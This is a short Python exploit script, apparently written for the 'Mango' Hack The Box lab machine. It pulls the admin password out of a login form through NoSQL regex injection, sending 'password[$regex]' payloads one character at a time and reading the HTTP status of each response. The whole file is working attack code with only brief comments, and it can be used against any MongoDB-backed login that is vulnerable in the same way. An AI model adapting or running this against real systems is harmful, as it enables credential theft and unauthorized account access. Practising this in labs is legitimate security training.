import requests

proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

def inject(data):
    r = requests.post("http://staging-order.mango.htb/", data=data, proxies=proxies, allow_redirects=False)
    if r.status_code != 200:
        return True

secret = ""
payload = ""

while True:

    # If the script quits "for" range, this check if the word is complete with '$'
    data = { "username":"admin", "password[$regex]":"^" + payload + "$", "login":"login" }
    if inject(data):
        break

    for i in range(32, 127):

        # Bypassing charachters that may be confused with regex expressions
        # This could work as well --> import re; re.escape(chr(i))
        if chr(i) in ['.', '?', '*', '^','+', '$', '|']:
            payload = secret + '\\' + chr(i)
        else:
            payload = secret + chr(i)
        print("\r" + payload, flush=False, end='')

        data = { "username":"admin", "password[$regex]":"^" + payload, "login":"login" }
        if inject(data):
            print("\r" + payload, flush=True, end='')
            secret = secret + chr(i)
            break

